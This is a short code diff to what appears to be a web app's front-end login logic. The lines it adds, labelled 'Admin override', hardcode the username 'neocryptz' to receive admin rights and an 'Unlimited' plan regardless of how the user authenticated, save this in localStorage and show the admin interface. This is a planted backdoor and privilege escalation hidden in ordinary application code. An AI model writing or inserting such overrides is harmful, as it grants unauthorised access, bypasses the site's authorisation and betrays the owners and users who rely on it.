@@ -1976,6 +1976,8 @@
                      currentUser.is_co_admin = currentUser.is_admin; // flag: co-admin, not owner
                 }
 
+                // Admin override — always grant admin rights to neocryptz regardless of which auth path was used
+                if (currentUser && currentUser.username === 'neocryptz') { currentUser.is_admin = true; currentUser.plan = 'Unlimited'; localStorage.setItem('currentUser', JSON.stringify(currentUser)); }
                 if (currentUser.is_admin) {
                      document.getElementById('admin-icon-wrap').style.display = 'inline-block';
                      document.getElementById('user-icon').style.display = 'none';
